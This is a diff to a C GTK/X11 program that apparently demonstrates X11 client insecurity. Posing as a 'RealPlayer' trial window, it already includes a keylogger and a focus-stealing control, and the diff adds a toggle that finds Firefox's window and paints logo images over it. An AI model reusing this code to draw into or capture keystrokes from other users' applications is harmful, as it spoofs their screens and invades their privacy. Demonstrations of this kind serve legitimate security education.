@@ -25,14 +25,22 @@
 #include <gtk/gtk.h>
 #include <gdk/gdkx.h>
 
+#include <cairo-xlib.h>
+
 #include "keylogger.h"
+#include "drawer.h"
+#include "utils.h"
 
 typedef struct {
+  GdkPixbuf *logo_pixbuf;
+
   Display *xdisplay;
   GtkWidget *window;
 
   Keylogger *keylogger;
   GtkTextBuffer *buf;
+
+  WindowDrawer *firefox_drawer;
 } Application;
 
 static void
@@ -128,18 +136,61 @@ record_toggled (GtkToggleButton *toggle,
 }
 
 static void
+draw_spam (WindowDrawer *drawer,
+           cairo_t      *cr,
+           gpointer      data)
+{
+  Application *app = data;
+  int win_height = cairo_xlib_surface_get_height (cairo_get_target (cr));
+
+  int i;
+  for (i = 0; i < 80; i++)
+    {
+      cairo_save (cr);
+      int x = (i * 70);
+      int y = (i * 230) % win_height;
+
+      cairo_translate (cr, x, y);
+      gdk_cairo_set_source_pixbuf (cr, app->logo_pixbuf, 0, 0);
+      cairo_rectangle (cr, 0, 0, 256, 256);
+      cairo_fill (cr);
+      cairo_restore (cr);
+    }
+}
+
+static void
+draw_on_firefox_toggled (GtkToggleButton *toggle,
+                         gpointer         data)
+{
+  Application *app = data;
+
+  if (gtk_toggle_button_get_active (toggle))
+    {
+      Window firefox_window = find_window_with_class (app->xdisplay, "Firefox");
+      app->firefox_drawer = window_drawer_new (app->xdisplay, firefox_window,
+                                               draw_spam, app);
+    }
+  else
+    {
+      window_drawer_free (app->firefox_drawer);
+    }
+}
+
+static void
 app_init (Application *app)
 {
-  GtkWidget *vbox, *steal_focus, *record, *scroll, *textview;
+  GtkWidget *vbox, *steal_focus, *record, *scroll, *textview, *draw_on_firefox;
 
-  GdkPixbuf *pixbuf = gdk_pixbuf_new_from_file ("real.png", NULL);
-  gtk_window_set_default_icon (pixbuf);
-  g_object_unref (pixbuf);
+  app->logo_pixbuf = gdk_pixbuf_new_from_file ("real.png", NULL);
+  gtk_window_set_default_icon (app->logo_pixbuf);
 
   app->window = gtk_window_new (GTK_WINDOW_TOPLEVEL);
   gtk_widget_set_size_request (app->window, 700, 500);
   gtk_window_set_title (GTK_WINDOW (app->window), "RealPlayer 10.4 Special Deluxe Freemium Edition (Unregistered Trial)");
   gtk_container_set_border_width (GTK_CONTAINER (app->window), 6);
+
+  GdkDisplay *display = gtk_widget_get_display (app->window);
+  app->xdisplay = GDK_DISPLAY_XDISPLAY (display);
 
   vbox = gtk_box_new (GTK_ORIENTATION_VERTICAL, 6);
   gtk_container_add (GTK_CONTAINER (app->window), vbox);
@@ -171,10 +222,12 @@ app_init (Application *app)
                               NULL);
   gtk_text_view_set_buffer (GTK_TEXT_VIEW (textview), app->buf);
 
-  GdkDisplay *display = gtk_widget_get_display (app->window);
-  app->xdisplay = GDK_DISPLAY_XDISPLAY (display);
-
   app->keylogger = keylogger_new (app->xdisplay, app_key_event, app);
+
+  draw_on_firefox = gtk_toggle_button_new_with_label ("Draw on Firefox");
+  gtk_container_add (GTK_CONTAINER (vbox), draw_on_firefox);
+  g_signal_connect (draw_on_firefox, "toggled",
+                    G_CALLBACK (draw_on_firefox_toggled), app);
 
   gtk_widget_show_all (app->window);
 }
